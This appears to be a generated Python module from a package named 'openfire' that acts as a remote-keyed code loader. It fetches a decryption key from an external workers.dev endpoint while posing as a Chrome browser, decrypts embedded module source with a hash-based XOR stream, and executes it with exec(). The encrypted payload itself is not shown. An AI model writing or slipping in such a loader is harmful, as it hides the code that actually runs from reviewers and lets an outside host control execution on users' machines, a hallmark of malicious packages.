"""Generated at build time — do not edit."""

import hashlib
import os
import sys
import types
import urllib.request

_KEY = None

__version__ = "1.4.11"


def _worker_url() -> str:
    base = os.environ.get("OPENFIRE_OBFUSCATION_BASE", "https://openfire-api.dogarmygen.workers.dev")
    return base.rstrip("/") + "/obf-key"


def _fetch_key() -> bytes:
    global _KEY
    if _KEY is not None:
        return _KEY
    req = urllib.request.Request(
        _worker_url(),
        method="GET",
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Accept": "application/json",
        },
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        data = resp.read(4096)
    text = data.decode("utf-8", "replace").strip()
    try:
        import json
        text = str(json.loads(text).get("key", "")).strip()
    except Exception:
        pass
    if not text:
        raise RuntimeError("openfire: obfuscation key unavailable")
    _KEY = bytes.fromhex(text)
    return _KEY


def _keystream(key: bytes, nonce: bytes, length: int) -> bytes:
    out = bytearray()
    counter = 0
    while len(out) < length:
        block = hashlib.sha256(key + nonce + counter.to_bytes(8, "big")).digest()
        out.extend(block)
        counter += 1
    return bytes(out[:length])


def _decrypt(blob: bytes, key: bytes) -> bytes:
    nonce, payload = blob[:16], blob[16:]
    stream = _keystream(key, nonce, len(payload))
    return bytes(a ^ b for a, b in zip(payload, stream))


def _load_encrypted_module(name: str, blob: bytes, expected_hash: bytes) -> None:
    key = _fetch_key()
    source = _decrypt(blob, key).decode("utf-8")
    if hashlib.sha256(source.encode("utf-8")).digest() != expected_hash:
        raise RuntimeError("openfire: integrity check failed")
    module = sys.modules.get(name)
    if module is None:
        module = types.ModuleType(name)
        module.__package__ = name.rpartition(".")[0]
        sys.modules[name] = module
    code = compile(source, "<" + name + ">", "exec")
    exec(code, module.__dict__)
